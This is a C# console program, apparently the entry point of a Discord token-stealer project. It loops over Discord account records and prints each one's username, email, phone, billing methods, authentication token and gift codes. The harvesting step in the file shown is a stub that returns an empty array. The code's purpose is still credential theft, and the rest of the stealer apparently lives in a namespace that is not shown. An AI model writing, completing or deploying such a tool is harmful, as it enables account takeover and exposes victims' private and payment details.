using NotGangAffilated.othershit;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace NotGangAffilated
{
    internal class Program
    { 
        
        static async Task Main(string[] args)
        {

            var getTokens = Task.Run(() => new DiscordAccountFormat[] { });
            await Task.WhenAll(getTokens);
            var discordAccounts = await getTokens;
            foreach (DiscordAccountFormat account in discordAccounts)
            {
                string username = account.Username;
                string userid = account.UserId;
                string mfa = account.Mfa ? "Yes" : "No";
                string email = account.Email;
                string phone = account.PhoneNumber;
                string verified = account.Verified ? "Yes" : "No";
                string nitro = account.Nitro;
                string token = account.Token;

                string billing = string.Join(", ", account.BillingType);
                billing = string.IsNullOrWhiteSpace(billing) ? "(None)" : billing;

                string gifts = account.Gift.Length > 0
                    ? "Gift Codes: \n\t" + string.Join("\n\t",
                        account.Gift.Select(gift => $"{gift.Title}: {gift.Code}"))
                    : "Gift Codes: (None)";

                 Console.WriteLine($@"

Username: {username}
User ID: {userid}
MFA Enabled: {mfa}
Email: {email}
Phone Number: {phone}
Verified User: {verified}
Nitro: {nitro}
Billing Methods: {billing}
Token: {token}

{gifts}

".TrimStart());
            }
            Console.WriteLine("done");
            Console.ReadLine();
        }
    }
}
